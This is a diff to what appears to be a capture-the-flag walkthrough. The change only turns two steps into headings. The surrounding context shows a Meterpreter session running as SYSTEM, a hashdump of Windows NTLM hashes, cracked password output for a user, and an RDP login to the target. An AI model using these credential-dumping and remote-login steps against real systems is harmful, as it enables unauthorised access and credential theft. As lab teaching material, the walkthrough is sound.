@@ -116,7 +116,7 @@ Server username: NT AUTHORITY\SYSTEM
 [*] Migration completed successfully.
 ```
 
-Dump the passwords and save them to a file.
+### Dump the passwords and save them to a file.
 ```
 > hashdump
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
@@ -136,7 +136,7 @@ alqfna22         (Jon)
 Use the "--show --format=NT" options to display all of the cracked passwords reliably
 Session completed
 ```
-Once we have the password and there is RDP port open, lets login in.
+### Once we have the password and there is RDP port open, lets login in.
 ```
 $rdclient <target_ip>
 ->login
